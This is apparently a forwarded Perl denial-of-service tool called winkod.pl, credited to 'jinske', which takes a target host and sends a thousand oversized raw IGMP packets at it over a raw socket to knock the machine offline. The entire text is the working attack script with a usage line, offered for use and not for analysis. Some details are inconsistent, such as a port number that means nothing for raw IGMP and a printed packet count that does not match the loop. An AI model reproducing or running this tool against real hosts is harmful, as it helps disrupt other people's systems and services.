#!/usr/bin/perl
#
# winkod.pl by jinske
# tested Red Hat Linux kernel-2.2.14

$ARGC=@ARGV;
print "winkod.pl by jinske\n";
if ($ARGC !=1) {
 print "usage: $0 <host>\n";
        exit;
}
use Socket;
my($remote,$port,$iaddr,$paddr,$proto,$hits);
$remote=$ARGV[0];
$hits=100;
$port = "139";
$iaddr = inet_aton($remote);
$paddr = sockaddr_in($port, $iaddr);
$proto = getprotobyname('igmp');

$msg = 'b' x 15000;

print "attempting connection to $ARGV[0]..";
socket(SOCK, PF_INET, SOCK_RAW, 2);
connect(SOCK, $paddr) or die "no connectf";
print " [connected: sending IGMP]\n";

print "\nsending packet 1500000\n";

for ($hits=0 ; $hits < 1000;  ++$hits) {
 if(send(SOCK,$msg,0) == -1) {
  print "error send\n\n";
  exit(1);
 }
}
print "DONE\n\n";
exit;


----- End forwarded message -----